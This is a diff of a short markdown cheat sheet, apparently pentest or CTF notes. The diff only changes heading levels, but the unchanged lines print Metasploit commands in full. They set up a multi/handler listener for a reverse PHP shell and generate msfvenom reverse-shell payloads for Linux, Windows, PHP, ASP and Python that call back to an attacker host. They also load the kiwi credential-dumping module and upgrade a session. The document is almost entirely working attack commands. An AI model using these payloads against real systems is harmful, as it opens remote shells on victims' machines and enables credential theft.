@@ -2,7 +2,7 @@
 
 shell
 
-# setting
+## setting
 
 msf6 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set payload php/reverse_php
@@ -10,31 +10,31 @@ msf5 exploit(multi/handler) > set lhost 10.0.2.19
 msf6 exploit(multi/handler) > set lport 7777
 msf6 exploit(multi/handler) > show options
 
-# output executable file on linux
+## output executable file on linux
 
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
 
-# Windows
+## Windows
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
 
-# PHP
+## PHP
 
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
 
-# ASP
+## ASP
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
 
-# Python
+## Python
 
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
 
-# load
+## load
 
 load python
 load kiwi
 
-# upgrade shell
+## upgrade shell
 
 sessions -u 3
